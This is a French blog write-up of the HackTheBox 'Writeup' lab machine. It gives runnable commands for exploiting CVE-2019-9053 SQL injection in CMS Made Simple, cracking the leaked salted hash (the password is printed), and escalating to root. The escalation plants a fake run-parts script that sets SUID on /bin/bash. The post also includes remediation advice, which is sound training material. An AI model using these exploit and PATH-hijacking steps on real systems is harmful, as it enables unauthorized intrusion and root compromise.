---
layout: post
title: "Writeup - HackTheBox WriteUp"
date: 2024-09-14
categories: [CTF, HackTheBox, WriteUp]
tags: [WebApp, CMSMadeSimple, CVE-2019-9053, SQLInjection, PrivEsc, PathHijacking, ProcessMonitoring, Linux]
difficulty: Easy
platform: HackTheBox
author: Aubin SABY
lang: fr
permalink: /fr/blog/2024/01/25/writeup-htb-writeup/
excerpt: "Machine Linux hébergeant un CMS Made Simple vulnérable. Exploitation SQLi CVE-2019-9053 pour obtenir des credentials, puis escalade de privilèges via PATH hijacking."
---

<div class="bg-gradient-to-r from-green-500/10 to-cyan-500/10 p-10 rounded-xl mb-12 border-l-4 border-green-500 shadow-lg">
    <div class="flex flex-col md:flex-row items-start md:items-center justify-between mb-8 gap-6">
        <div class="flex-1">
            <h2 class="text-4xl md:text-5xl font-bold text-green-500 mb-3">
                <i class="fas fa-cube mr-3"></i>Writeup
            </h2>
            <p class="text-gray-700 dark:text-gray-300 text-lg md:text-xl">
                CMS Made Simple SQLi + PATH Hijacking Privilege Escalation
            </p>
        </div>
        <div class="flex gap-3">
            <span class="px-5 py-2 bg-green-500 text-white rounded-lg text-sm font-semibold shadow-md">
                <i class="fas fa-circle text-xs mr-1"></i>Easy
            </span>
            <span class="px-5 py-2 bg-blue-500 text-white rounded-lg text-sm font-semibold shadow-md">
                <i class="fab fa-linux mr-1"></i>Linux
            </span>
        </div>
    </div>

    <div class="grid grid-cols-2 md:grid-cols-4 gap-6 mt-6">
        <div class="flex items-center gap-3">
            <div class="text-green-500 text-xl">
                <i class="fas fa-calendar"></i>
            </div>
            <div>
                <div class="text-xs uppercase tracking-wide text-gray-600 dark:text-gray-400">Date</div>
                <div class="font-semibold text-gray-800 dark:text-gray-100 text-lg">2024-09-14</div>
            </div>
        </div>

        <div class="flex items-center gap-3">
            <div class="text-blue-500 text-xl">
                <i class="fas fa-network-wired"></i>
            </div>
            <div>
                <div class="text-xs uppercase tracking-wide text-gray-600 dark:text-gray-400">IP</div>
                <div class="font-semibold text-gray-800 dark:text-gray-100 text-lg">10.10.10.138</div>
            </div>
        </div>

        <div class="flex items-center gap-3">
            <div class="text-purple-500 text-xl">
                <i class="fas fa-shield-alt"></i>
            </div>
            <div>
                <div class="text-xs uppercase tracking-wide text-gray-600 dark:text-gray-400">OS</div>
                <div class="font-semibold text-gray-800 dark:text-gray-100 text-lg">Debian</div>
            </div>
        </div>

        <div class="flex items-center gap-3">
            <div class="text-amber-500 text-xl">
                <i class="fas fa-star"></i>
            </div>
            <div>
                <div class="text-xs uppercase tracking-wide text-gray-600 dark:text-gray-400">Points</div>
                <div class="font-semibold text-gray-800 dark:text-gray-100 text-lg">20</div>
            </div>
        </div>
    </div>
</div>


## 🎯 Synopsis

**Writeup** est une machine <span class="text-highlight-green">**Linux de difficulté facile**</span> qui héberge un <span class="text-highlight-red">**CMS Made Simple**</span> vulnérable à une <span class="text-highlight-orange">**injection SQL (CVE-2019-9053)**</span>.

L'exploitation de cette vulnérabilité permet de récupérer des <span class="text-highlight-blue">**identifiants utilisateur**</span> incluant un hash salé. Après cracking, l'accès SSH est obtenu avec l'utilisateur `jkr`. L'énumération locale révèle que cet utilisateur appartient au groupe <span class="text-highlight-purple">**staff**</span>, disposant de droits d'écriture dans `/usr/local/bin`, un répertoire inclus dans le <span class="text-highlight-red">**PATH système**</span>. Cette configuration est exploitée via un <span class="text-highlight-orange">**PATH hijacking**</span> pour obtenir un <span class="text-highlight-green">**shell root**</span>.

<div class="grid md:grid-cols-2 gap-6 my-4">
    <div class="bg-white dark:bg-dark-navbar p-6 rounded-xl shadow-lg border-l-4 border-portfolio-violet">
        <h3 class="text-2xl font-bold text-portfolio-violet mb-4">
            <i class="fas fa-brain mr-2"></i>Compétences requises
        </h3>
        <ul class="space-y-2 text-gray-700 dark:text-gray-300">
            <li><i class="fas fa-check-circle text-green-500 mr-2"></i>Énumération web (HTTP, robots.txt, CMS)</li>
            <li><i class="fas fa-check-circle text-green-500 mr-2"></i>Connaissances fondamentales Linux</li>
            <li><i class="fas fa-check-circle text-green-500 mr-2"></i>Compréhension du système de groupes Unix</li>
            <li><i class="fas fa-check-circle text-green-500 mr-2"></i>Utilisation de Hashcat</li>
        </ul>
    </div>
    <div class="bg-white dark:bg-dark-navbar p-6 rounded-xl shadow-lg border-l-4 border-cyan-500">
        <h3 class="text-2xl font-bold text-cyan-500 mb-4">
            <i class="fas fa-rocket mr-2"></i>Compétences acquises
        </h3>
        <ul class="space-y-2 text-gray-700 dark:text-gray-300">
            <li><i class="fas fa-star text-amber-500 mr-2"></i>Exploitation SQLi (CVE-2019-9053)</li>
            <li><i class="fas fa-star text-amber-500 mr-2"></i>Cracking de hash salé avec Hashcat</li>
            <li><i class="fas fa-star text-amber-500 mr-2"></i>Escalade de privilèges par PATH hijacking</li>
            <li><i class="fas fa-star text-amber-500 mr-2"></i>Surveillance de processus avec pspy</li>
        </ul>
    </div>
</div>


## 🔍 Phase 1 — Reconnaissance réseau

### Scan de ports initial

On commence par un scan rapide de tous les ports TCP pour identifier les services exposés :

```bash
nmap -Pn -p- --min-rate=1000 -T4 10.10.10.138
```

### Énumération détaillée des services

Une fois les ports ouverts identifiés, on effectue un scan approfondi avec détection de version et scripts NSE :

```bash
ports=$(nmap -Pn -p- --min-rate=1000 -T4 10.10.10.138 | grep '^[0-9]' | cut -d'/' -f1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -sC -sV 10.10.10.138
```

<div class="bg-white dark:bg-dark-navbar p-5 rounded-xl shadow-lg my-4">
    <h4 class="text-xl font-bold mb-4 text-portfolio-violet flex items-center">
        <i class="fas fa-search mr-2"></i>Résultats du scan
    </h4>
    <div class="space-y-3">
        <div class="flex items-start gap-4 p-4 bg-blue-50 dark:bg-blue-900/20 rounded-lg border-l-4 border-blue-500">
            <div class="text-3xl text-blue-500">
                <i class="fas fa-network-wired"></i>
            </div>
            <div class="flex-1">
                <div class="font-bold text-lg text-blue-600 dark:text-blue-400">Port 22/TCP - SSH</div>
                <div class="text-gray-600 dark:text-gray-400 text-sm mt-1">OpenSSH 7.4p1 Debian</div>
                <div class="text-xs text-gray-500 dark:text-gray-500 mt-2">Service d'administration à distance sécurisé</div>
            </div>
        </div>
        <div class="flex items-start gap-4 p-4 bg-green-50 dark:bg-green-900/20 rounded-lg border-l-4 border-green-500">
            <div class="text-3xl text-green-500">
                <i class="fas fa-globe"></i>
            </div>
            <div class="flex-1">
                <div class="font-bold text-lg text-green-600 dark:text-green-400">Port 80/TCP - HTTP</div>
                <div class="text-gray-600 dark:text-gray-400 text-sm mt-1">Apache httpd 2.4.25</div>
                <div class="text-xs text-gray-500 dark:text-gray-500 mt-2">Serveur web hébergeant l'application cible</div>
            </div>
        </div>
    </div>
</div>

<div class="bg-cyan-100 dark:bg-cyan-900/20 border-l-4 border-cyan-500 p-4 my-4 rounded-r-lg">
    <p class="text-cyan-800 dark:text-cyan-200">
        <i class="fas fa-lightbulb mr-2 text-cyan-500"></i>
        <strong>Point d'entrée identifié :</strong> Le service web sur le port 80 constitue le vecteur d'attaque initial. Le scan détecte également un fichier <code>robots.txt</code>.
    </p>
</div>


## 🌐 Phase 2 — Analyse web et découverte du CMS

### Exploration du fichier robots.txt

Le fichier `robots.txt` révèle souvent des répertoires cachés :

```bash
curl http://10.10.10.138/robots.txt
```

Résultat :

```
User-agent: *
Disallow: /writeup/
```

<div class="bg-green-100 dark:bg-green-900/20 border-l-4 border-green-500 p-4 my-4 rounded-r-lg">
    <p class="text-green-800 dark:text-green-200">
        <i class="fas fa-check-circle mr-2 text-green-500"></i>
        <strong>Répertoire découvert :</strong> <code class="bg-green-200 dark:bg-green-800 px-2 py-1 rounded font-mono">/writeup/</code>
    </p>
</div>

<div class="bg-cyan-100 dark:bg-cyan-900/20 border-l-4 border-cyan-500 p-4 my-4 rounded-r-lg">
    <p class="text-cyan-800 dark:text-cyan-200">
        <i class="fas fa-info-circle mr-2 text-cyan-500"></i>
        <strong>Technique clé :</strong> La directive <code>Disallow</code> dans robots.txt révèle souvent des dossiers que les administrateurs souhaitent cacher des moteurs de recherche, mais qui restent accessibles directement.
    </p>
</div>

### Identification du CMS

En naviguant vers `http://10.10.10.138/writeup/`, on découvre un **CMS Made Simple**.

L'analyse du code source HTML révèle :

```html
<meta name="Generator" content="CMS Made Simple - Copyright (C) 2004-2019" />
```

<div class="bg-white dark:bg-dark-navbar p-6 rounded-xl shadow-lg my-4 border-l-4 border-blue-500">
    <div class="flex items-start gap-4 mb-4">
        <div class="text-4xl text-blue-500">
            <i class="fas fa-newspaper"></i>
        </div>
        <div class="flex-1">
            <h4 class="text-xl font-bold text-gray-800 dark:text-gray-200">CMS Made Simple</h4>
            <p class="text-gray-600 dark:text-gray-400">Version datant de 2019</p>
        </div>
    </div>
    <p class="text-gray-700 dark:text-gray-300">
        CMS Made Simple est un système de gestion de contenu open-source. Une version de 2019 est potentiellement vulnérable à des CVE connues.
    </p>
</div>


## 💥 Phase 3 — Exploitation CVE-2019-9053 (SQL Injection)

### Analyse de la vulnérabilité

<div class="bg-red-50 dark:bg-red-900/20 p-6 rounded-xl border-l-4 border-red-500 my-4">
    <h4 class="text-xl font-bold text-red-600 dark:text-red-400 mb-3 flex items-center">
        <i class="fas fa-bug mr-2"></i>CVE-2019-9053 - SQL Injection
    </h4>
    <div class="space-y-2 text-gray-700 dark:text-gray-300">
        <div class="grid md:grid-cols-2 gap-4">
            <div>
                <span class="font-semibold text-red-600 dark:text-red-400">Versions affectées :</span> CMS Made Simple ≤ 2.2.10
            </div>
            <div>
                <span class="font-semibold text-red-600 dark:text-red-400">Type :</span> Blind Time-Based SQLi
            </div>
        </div>
        <div>
            <span class="font-semibold text-red-600 dark:text-red-400">CVSS Score :</span> 9.8 (Critical)
        </div>
        <div class="mt-4">
            <span class="font-semibold text-red-600 dark:text-red-400">Description :</span><br>
            Une faille SQLi aveugle basée sur le temps permet d'extraire des informations sensibles de la base de données via la manipulation d'un paramètre non filtré.
        </div>
    </div>
</div>

### Exploitation

Téléchargement du PoC :

```bash
git clone https://github.com/ELIZEUOPAIN/CVE-2019-9053-CMS-Made-Simple-2.2.10---SQL-Injection-Exploit
cd CVE-2019-9053-CMS-Made-Simple-2.2.10---SQL-Injection-Exploit
python cve.py -u http://10.10.10.138/writeup/ --crack -w best110.txt
```

<div class="bg-white dark:bg-dark-navbar p-5 rounded-xl shadow-lg my-4 border-l-4 border-green-500">
    <h4 class="text-xl font-bold mb-4 text-green-600 dark:text-green-400 flex items-center">
        <i class="fas fa-key mr-2"></i>Informations extraites
    </h4>
    <div class="bg-gray-100 dark:bg-gray-800 p-4 rounded font-mono text-sm space-y-1">
        <div class="text-gray-700 dark:text-gray-300">
            <span class="text-blue-600 dark:text-blue-400">Username:</span> <span class="text-green-600 dark:text-green-400">jkr</span>
        </div>
        <div class="text-gray-700 dark:text-gray-300">
            <span class="text-blue-600 dark:text-blue-400">Email:</span> <span class="text-green-600 dark:text-green-400">jkr@writeup.htb</span>
        </div>
        <div class="text-gray-700 dark:text-gray-300">
            <span class="text-blue-600 dark:text-blue-400">Hash:</span> <span class="text-orange-600 dark:text-orange-400">62def4866937f08cc13bab43bb14e6f7</span>
        </div>
        <div class="text-gray-700 dark:text-gray-300">
            <span class="text-blue-600 dark:text-blue-400">Salt:</span> <span class="text-purple-600 dark:text-purple-400">5a599ef579066807</span>
        </div>
    </div>
</div>

### Cracking du hash avec Hashcat

Préparation du fichier de hash :

```bash
echo '62def4866937f08cc13bab43bb14e6f7:5a599ef579066807' > hash
```

Cracking (mode 20 = md5($salt.$pass)) :

```bash
hashcat -m 20 -a 0 hash /usr/share/wordlists/rockyou.txt
```

<div class="bg-green-100 dark:bg-green-900/20 border-l-4 border-green-500 p-4 my-4 rounded-r-lg">
    <p class="text-green-800 dark:text-green-200">
        <i class="fas fa-unlock mr-2 text-green-500"></i>
        <strong>Mot de passe trouvé :</strong> <code class="bg-green-200 dark:bg-green-800 px-2 py-1 rounded font-mono">raykayjay9</code>
    </p>
</div>

## 🔑 Phase 4 — Accès SSH et user flag

### Connexion SSH

Tentative de connexion avec les credentials découverts :

```bash
ssh jkr@10.10.10.138
```

**Mot de passe :** `raykayjay9`

<div class="bg-green-100 dark:bg-green-900/20 border-l-4 border-green-500 p-4 my-4 rounded-r-lg">
    <p class="text-green-800 dark:text-green-200 font-bold text-lg">
        <i class="fas fa-check-circle mr-2 text-green-500"></i>
        Connexion SSH réussie!
    </p>
</div>

### Validation de l'accès

```bash
id
```

<div class="bg-gray-100 dark:bg-gray-800 p-4 rounded-lg my-4 font-mono text-sm">
    <div class="text-gray-700 dark:text-gray-300">
        uid=1000(jkr) gid=1000(jkr) groups=1000(jkr),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),50(staff),103(netdev)
    </div>
</div>

<div class="bg-amber-100 dark:bg-amber-900/20 border-l-4 border-amber-500 p-4 my-4 rounded-r-lg">
    <p class="text-amber-800 dark:text-amber-200">
        <i class="fas fa-exclamation-triangle mr-2 text-amber-500"></i>
        <strong>Observation importante :</strong> L'utilisateur appartient au groupe <code>50(staff)</code>, un groupe non standard qui mérite investigation.
    </p>
</div>

### Récupération du user flag

```bash
cat ~/user.txt
```

<div class="bg-green-100 dark:bg-green-900/20 border-l-4 border-green-500 p-4 my-4 rounded-r-lg">
    <p class="text-green-800 dark:text-green-200">
        <i class="fas fa-flag mr-2 text-green-500"></i>
        <strong>USER FLAG OBTENU !</strong> Première étape complétée.
    </p>
</div>


## 🧭 Phase 5 — Énumération locale : le groupe staff

### Analyse des groupes

Vérification des groupes de l'utilisateur :

```bash
groups jkr
```

Le groupe **staff** se distingue. Selon la documentation Debian :

<div class="bg-cyan-100 dark:bg-cyan-900/20 border-l-4 border-cyan-500 p-4 my-4 rounded-r-lg">
    <p class="text-cyan-800 dark:text-cyan-200">
        <i class="fas fa-book mr-2 text-cyan-500"></i>
        <strong>Documentation Debian :</strong> Le groupe "staff" permet d'écrire dans <code>/usr/local/bin</code> et <code>/usr/local/sbin</code> sans privilèges root. Ces répertoires sont inclus dans le <strong>PATH root</strong>.
    </p>
</div>

### Vérification des permissions

```bash
ls -ld /usr/local/bin/ /usr/local/sbin/
```

<div class="bg-gray-100 dark:bg-gray-800 p-4 rounded-lg my-4 font-mono text-sm">
    <div class="text-gray-700 dark:text-gray-300">
        drwxrwsr-x 2 root staff 20480 ... /usr/local/bin/<br>
        drwxrwsr-x 2 root staff 12288 ... /usr/local/sbin/
    </div>
</div>

<div class="bg-red-100 dark:bg-red-900/20 border-l-4 border-red-500 p-4 my-4 rounded-r-lg">
    <p class="text-red-800 dark:text-red-200">
        <i class="fas fa-search mr-2 text-red-500"></i>
        <strong>Vecteur d'escalade identifié :</strong> Si un script root exécute une commande depuis le PATH, il peut être <strong>hijacké</strong> en plaçant un binaire malveillant dans <code>/usr/local/bin</code>.
    </p>
</div>

## 🔎 Phase 6 — Surveillance des processus avec pspy

### Déploiement de pspy

Objectif : observer les processus exécutés automatiquement par root.

Téléchargement et transfert :

```bash
wget https://github.com/DominicBreuker/pspy/releases/download/v1.0.0/pspy32
scp pspy32 jkr@10.10.10.138:/tmp
```

Exécution :

```bash
chmod +x /tmp/pspy32
/tmp/pspy32
```

### Analyse des résultats

<div class="bg-white dark:bg-dark-navbar p-5 rounded-xl shadow-lg my-4 border-l-4 border-purple-500">
    <h4 class="text-xl font-bold mb-4 text-purple-600 dark:text-purple-400 flex items-center">
        <i class="fas fa-eye mr-2"></i>Observation critique
    </h4>
    <p class="text-gray-700 dark:text-gray-300 mb-3">
        Lorsqu'un utilisateur SSH se connecte, <strong>root exécute run-parts</strong> via <code>/usr/bin/env</code>, avec un PATH commençant par <code>/usr/local/bin</code>.
    </p>
    <div class="bg-gray-100 dark:bg-gray-800 p-4 rounded font-mono text-sm">
        <div class="text-gray-700 dark:text-gray-300">
            PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin<br>
            run-parts --lsbsysinit /etc/update-motd.d
        </div>
    </div>
</div>

<div class="bg-amber-100 dark:bg-amber-900/20 border-l-4 border-amber-500 p-4 my-4 rounded-r-lg">
    <p class="text-amber-800 dark:text-amber-200">
        <i class="fas fa-crosshairs mr-2 text-amber-500"></i>
        <strong>Cible identifiée :</strong> <code>run-parts</code> peut être remplacé par un script malveillant dans <code>/usr/local/bin</code> pour être exécuté avec les privilèges root.
    </p>
</div>

## ⚙️ Phase 7 — Exploitation : PATH Hijacking

### Stratégie d'exploitation

Nous allons :
1. Créer un faux binaire `run-parts` dans `/usr/local/bin`
2. Ce binaire définira le bit SUID sur `/bin/bash`
3. Lors de la prochaine connexion SSH, root exécutera notre binaire

### Exploitation

Création du binaire piégé :

```bash
echo -e '#!/bin/bash\nchmod u+s /bin/bash' > /usr/local/bin/run-parts
chmod +x /usr/local/bin/run-parts
```

Déconnexion et reconnexion SSH :

```bash
exit
ssh jkr@10.10.10.138
```

Vérification :

```bash
ls -l /bin/bash
```

<div class="bg-gray-100 dark:bg-gray-800 p-4 rounded-lg my-4 font-mono text-sm">
    <div class="text-green-700 dark:text-green-300">
        -rwsr-xr-x 1 root root 1099016 ... /bin/bash
    </div>
</div>

<div class="bg-green-100 dark:bg-green-900/20 border-l-4 border-green-500 p-4 my-4 rounded-r-lg">
    <p class="text-green-800 dark:text-green-200 font-bold text-lg">
        <i class="fas fa-check-circle mr-2 text-green-500"></i>
        Le bit SUID est maintenant défini sur /bin/bash !
    </p>
</div>

## 👑 Phase 8 — Escalade vers root

### Exécution avec privilèges préservés

Lancement de bash avec l'option `-p` (preserve privileges) :

```bash
/bin/bash -p
id
```

<div class="bg-gray-100 dark:bg-gray-800 p-4 rounded-lg my-4 font-mono text-sm">
    <div class="text-gray-700 dark:text-gray-300">
        uid=1000(jkr) gid=1000(jkr) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),50(staff),103(netdev),1000(jkr)
    </div>
</div>

<div class="bg-green-100 dark:bg-green-900/20 border-l-4 border-green-500 p-4 my-4 rounded-r-lg">
    <p class="text-green-800 dark:text-green-200">
        <i class="fas fa-crown mr-2 text-amber-500"></i>
        <strong>ROOT SHELL OBTENU !</strong> euid=0(root) atteint.
    </p>
</div>

### Récupération du root flag

```bash
cat /root/root.txt
```

<div class="bg-gradient-to-r from-amber-500/10 to-yellow-500/10 p-6 rounded-xl border-l-4 border-amber-500 my-4">
    <div class="flex items-center gap-4">
        <div class="text-5xl text-amber-500">
            <i class="fas fa-trophy"></i>
        </div>
        <div class="flex-1">
            <h4 class="text-2xl font-bold text-amber-600 dark:text-amber-400 mb-2">Machine Pwned!</h4>
            <p class="text-gray-700 dark:text-gray-300">
                <i class="fas fa-flag text-green-500 mr-2"></i><strong>User flag :</strong> /home/jkr/user.txt<br>
                <i class="fas fa-flag text-red-500 mr-2"></i><strong>Root flag :</strong> /root/root.txt
            </p>
        </div>
    </div>
</div>

## 📋 Phase 9 — Recommandations et remédiations

<div class="grid md:grid-cols-2 gap-6 my-4">
    <div class="bg-white dark:bg-dark-navbar p-6 rounded-xl shadow-lg border-l-4 border-red-500">
        <h4 class="text-xl font-bold text-red-600 dark:text-red-400 mb-4 flex items-center">
            <i class="fas fa-globe mr-2"></i>Application
        </h4>
        <ul class="space-y-3 text-gray-700 dark:text-gray-300">
            <li class="flex items-start gap-2">
                <i class="fas fa-check text-green-500 mt-1"></i>
                <span>Mettre à jour CMS Made Simple pour corriger CVE-2019-9053</span>
            </li>
            <li class="flex items-start gap-2">
                <i class="fas fa-check text-green-500 mt-1"></i>
                <span>Utiliser des mots de passe forts et uniques</span>
            </li>
            <li class="flex items-start gap-2">
                <i class="fas fa-check text-green-500 mt-1"></i>
                <span>Éviter d'exposer les métadonnées de version dans le HTML</span>
            </li>
        </ul>
    </div>
    <div class="bg-white dark:bg-dark-navbar p-6 rounded-xl shadow-lg border-l-4 border-blue-500">
        <h4 class="text-xl font-bold text-blue-600 dark:text-blue-400 mb-4 flex items-center">
            <i class="fas fa-server mr-2"></i>Système
        </h4>
        <ul class="space-y-3 text-gray-700 dark:text-gray-300">
            <li class="flex items-start gap-2">
                <i class="fas fa-check text-green-500 mt-1"></i>
                <span>Restreindre les droits du groupe staff sur /usr/local/bin</span>
            </li>
            <li class="flex items-start gap-2">
                <i class="fas fa-check text-green-500 mt-1"></i>
                <span>Utiliser des chemins absolus dans les scripts root</span>
            </li>
            <li class="flex items-start gap-2">
                <i class="fas fa-check text-green-500 mt-1"></i>
                <span>Limiter les exécutions automatiques (update-motd)</span>
            </li>
            <li class="flex items-start gap-2">
                <i class="fas fa-check text-green-500 mt-1"></i>
                <span>Surveiller les connexions SSH et activités suspectes</span>
            </li>
        </ul>
    </div>
</div>

---

## 📝 Récapitulatif des commandes

### 🔍 Phase 1 : Reconnaissance

```bash
# 1. Scan de ports
nmap -Pn -p- --min-rate=1000 -T4 10.10.10.138
ports=$(nmap -Pn -p- --min-rate=1000 -T4 10.10.10.138 | grep '^[0-9]' | cut -d'/' -f1 | tr '\n' ',' | sed s/,$//)  
nmap -p$ports -sC -sV 10.10.10.138
# → Ports 22, 80 ouverts + robots.txt

# 2. Découverte
curl http://10.10.10.138/robots.txt
# → /writeup/ (CMS Made Simple)
```

### 💥 Phase 2 : Exploitation CVE-2019-9053

```bash
# 1. Exploitation SQLi
python cve.py -u http://10.10.10.138/writeup/ --crack -w best110.txt
# → User: jkr, Hash+Salt récupérés

# 2. Cracking
echo '62def4866937f08cc13bab43bb14e6f7:5a599ef579066807' > hash
hashcat -m 20 -a 0 hash /usr/share/wordlists/rockyou.txt
# → Password: raykayjay9
```

### 🔑 Phase 3 : Accès SSH

```bash
ssh jkr@10.10.10.138
cat ~/user.txt
id  # → groupe staff
```

### 🔍 Phase 4 : Monitoring

```bash
# Transfer pspy
scp pspy32 jkr@10.10.10.138:/tmp
chmod +x /tmp/pspy32
/tmp/pspy32
# → run-parts exécuté par root
```

### 👑 Phase 5 : PATH Hijacking

```bash
# 1. Créer fake run-parts
echo -e '#!/bin/bash\nchmod u+s /bin/bash' > /usr/local/bin/run-parts
chmod +x /usr/local/bin/run-parts

# 2. Reconnecter SSH (déclenche run-parts)
ssh jkr@10.10.10.138

# 3. Shell root
/bin/bash -p
cat /root/root.txt
```

---

## 🔗 Chaîne d'attaque résumée

<div class="bg-white dark:bg-dark-navbar px-6 py-5 rounded-xl shadow-lg my-8">
    <h3 class="text-2xl font-bold text-portfolio-violet mb-4 flex items-center">
        <i class="fas fa-project-diagram mr-3"></i>Parcours d'attaque complet
    </h3>
    <div class="space-y-4">
        <div class="flex items-start gap-4 p-4 bg-blue-50 dark:bg-blue-900/20 rounded-lg border-l-4 border-blue-500">
            <div class="text-3xl font-bold text-blue-500 mt-1">1</div>
            <div class="flex-1">
                <div class="font-bold text-blue-600 dark:text-blue-400">Reconnaissance et énumération</div>
                <div class="text-sm text-gray-600 dark:text-gray-400">Nmap → robots.txt → /writeup/ → CMS Made Simple</div>
            </div>
        </div>
        <div class="flex items-start gap-4 p-4 bg-green-50 dark:bg-green-900/20 rounded-lg border-l-4 border-green-500">
            <div class="text-3xl font-bold text-green-500 mt-1">2</div>
            <div class="flex-1">
                <div class="font-bold text-green-600 dark:text-green-400">Exploitation et accès initial</div>
                <div class="text-sm text-gray-600 dark:text-gray-400">CVE-2019-9053 SQLi → Hash cracking → SSH jkr</div>
            </div>
        </div>
        <div class="flex items-start gap-4 p-4 bg-purple-50 dark:bg-purple-900/20 rounded-lg border-l-4 border-purple-500">
            <div class="text-3xl font-bold text-purple-500 mt-1">3</div>
            <div class="flex-1">
                <div class="font-bold text-purple-600 dark:text-purple-400">Énumération locale</div>
                <div class="text-sm text-gray-600 dark:text-gray-400">Groupe staff → /usr/local/bin writable → pspy monitoring</div>
            </div>
        </div>
        <div class="flex items-start gap-4 p-4 bg-red-50 dark:bg-red-900/20 rounded-lg border-l-4 border-red-500">
            <div class="text-3xl font-bold text-red-500 mt-1">4</div>
            <div class="flex-1">
                <div class="font-bold text-red-600 dark:text-red-400">Escalade de privilèges</div>
                <div class="text-sm text-gray-600 dark:text-gray-400">PATH hijacking → Fake run-parts → SUID bash → Root</div>
            </div>
        </div>
    </div>
</div>

---

## 🏷️ Tags & Références

<div class="flex flex-wrap gap-2 my-4" style="line-height: 1.5;">
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(59, 130, 246, 0.1); color: #3b82f6; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">WebApp</span>
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(34, 197, 94, 0.1); color: #22c55e; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">CMSMadeSimple</span>
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(239, 68, 68, 0.1); color: #ef4444; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">CVE-2019-9053</span>
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(168, 85, 247, 0.1); color: #a855f7; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">SQLInjection</span>
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(245, 158, 11, 0.1); color: #f59e0b; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">PrivEsc</span>
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(99, 102, 241, 0.1); color: #6366f1; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">PathHijacking</span>
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(236, 72, 153, 0.1); color: #ec4899; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">ProcessMonitoring</span>
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(107, 114, 128, 0.1); color: #6b7280; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">Linux</span>
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(6, 182, 212, 0.1); color: #06b6d4; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">HackTheBox</span>
</div>

<div class="bg-white dark:bg-dark-navbar p-6 rounded-xl shadow-lg my-4">
    <h4 class="text-lg font-bold mb-4 text-portfolio-violet flex items-center">
        <i class="fas fa-link mr-2"></i>Références utiles
    </h4>
    <ul class="space-y-2 text-gray-700 dark:text-gray-300">
        <li>
            <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-9053" target="_blank" class="text-blue-600 dark:text-blue-400 hover:underline flex items-center gap-2">
                <i class="fas fa-external-link-alt text-xs"></i>
                CVE-2019-9053 - CMS Made Simple SQL Injection
            </a>
        </li>
        <li>
            <a href="https://github.com/DominicBreuker/pspy" target="_blank" class="text-blue-600 dark:text-blue-400 hover:underline flex items-center gap-2">
                <i class="fas fa-external-link-alt text-xs"></i>
                pspy - Process Monitoring Tool
            </a>
        </li>
        <li>
            <a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation#path-hijacking" target="_blank" class="text-blue-600 dark:text-blue-400 hover:underline flex items-center gap-2">
                <i class="fas fa-external-link-alt text-xs"></i>
                Linux PATH Hijacking Techniques
            </a>
        </li>
    </ul>
</div>

---

<div class="text-center my-12">
    <a href="{{ site.baseurl }}/fr/blog/" class="inline-block bg-gradient-to-r from-portfolio-violet to-cyan-500 hover:from-portfolio-violet-light hover:to-cyan-600 text-white font-bold py-4 px-10 rounded-lg shadow-lg transition duration-300 transform hover:scale-105">
        <i class="fas fa-arrow-left mr-2"></i>Retour au blog
    </a>
</div>
